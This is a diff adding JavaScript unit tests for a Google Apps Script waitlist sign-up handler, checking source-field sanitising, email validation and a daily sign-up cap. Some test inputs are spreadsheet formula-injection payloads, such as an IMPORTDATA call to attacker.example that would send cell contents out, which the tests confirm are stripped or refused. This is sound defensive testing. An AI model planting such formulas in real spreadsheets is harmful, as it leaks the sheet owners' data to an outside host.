@@ -313,3 +313,61 @@ describe('sameString_', () => {
     assert.equal(sameString_('', ''), true);
   });
 });
+
+describe('waitlist.gs sign-up: what a request can make it write', () => {
+  /** Loads the script over a sheet that can be added to, with a lock and a property store. */
+  function loadWritable(rows) {
+    const store = { SPREADSHEET_ID: 'x', SHEET_NAME: 'tab', SITE_URL: 'https://nidhi.today', waitlist_deduped_v1: '1' };
+    const c = load('scripts/waitlist.gs', rows);
+    const state = { locked: false, tracked: [] };
+    vm.runInContext('SHEET_CACHE = null; CONFIG_CACHE = null;', c);
+    const sheet = {
+      ...fakeSheet(rows),
+      getLastRow: () => rows.length,
+      getRange: (r, col, nr = 1, nc = 1) => ({ getValues: () => rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(col - 1, col - 1 + nc)) }),
+      appendRow: (values) => { if (!state.locked) throw new Error('appendRow without the lock'); rows.push(values); },
+      deleteRow: () => {},
+    };
+    c.SpreadsheetApp.openById = () => ({ getSheetByName: () => sheet });
+    c.PropertiesService = { getScriptProperties: () => ({
+      getProperty: (k) => (k in store ? store[k] : null),
+      setProperty: (k, v) => { store[k] = String(v); },
+      deleteProperty: (k) => { delete store[k]; },
+      getProperties: () => ({ ...store }),
+    }) };
+    c.LockService = { getScriptLock: () => ({ waitLock: () => { state.locked = true; }, releaseLock: () => { state.locked = false; } }) };
+    c.Utilities.formatDate = (d) => d.toISOString().slice(0, 10);
+    c.UrlFetchApp = { fetch: (_u, o) => { state.tracked.push(JSON.parse(o.payload)); } };
+    return { c, rows, store, state };
+  }
+  const header = ['email', 'source', 'created_at'];
+  const signup = (c, fields) => answer(c.doPost({ parameter: { action: 'waitlist', ...fields }, postData: { contents: '' } }));
+
+  it('keeps only a site path as the source', () => {
+    const { c, rows } = loadWritable([header.slice()]);
+    for (const [email, source] of [
+      ['a@x.io', '/free/loan-comparison/'], ['b@x.io', '=IMPORTDATA("https://attacker.example/?"&A2)'], ['c@x.io', '@x'], ['d@x.io', 'x'.repeat(400)],
+    ]) assert.deepEqual(signup(c, { email, source }), { ok: true });
+    // Rows written inside the VM are arrays of its own realm: compare what they hold.
+    assert.equal(JSON.stringify(rows.slice(1).map((r) => r.slice(0, 2))), JSON.stringify([['a@x.io', '/free/loan-comparison/'], ['b@x.io', ''], ['c@x.io', ''], ['d@x.io', '']]));
+  });
+
+  it('refuses an address that a spreadsheet would read as a formula', () => {
+    const { c, rows } = loadWritable([header.slice()]);
+    for (const email of ['=importdata("https://x.example/?a@b.c"&a2)', '+cmd@x.io', '-1@x.io', '@a@x.io', 'a"b@x.io', 'not-an-email']) {
+      assert.deepEqual(signup(c, { email }), { ok: false, error: 'invalid_email' }, email);
+    }
+    assert.equal(rows.length, 1);
+    assert.deepEqual(signup(c, { email: 'First.Last+tag@Example.co.uk' }), { ok: true });
+    assert.equal(rows[1][0], 'first.last+tag@example.co.uk');
+  });
+
+  it('stops adding rows at the day’s limit and says the same', () => {
+    const { c, rows, store } = loadWritable([header.slice()]);
+    vm.runInContext('MAX_SIGNUPS_PER_DAY_ = 2;', c);
+    store['signups:2020-01-01'] = '9';
+    for (const email of ['a@x.io', 'b@x.io', 'c@x.io', 'a@x.io']) assert.deepEqual(signup(c, { email }), { ok: true });
+    assert.equal(rows.slice(1).map((r) => r[0]).join(), 'a@x.io,b@x.io');
+    assert.equal(Object.keys(store).filter((k) => k.startsWith('signups:')).length, 1, 'earlier days are dropped');
+  });
+});
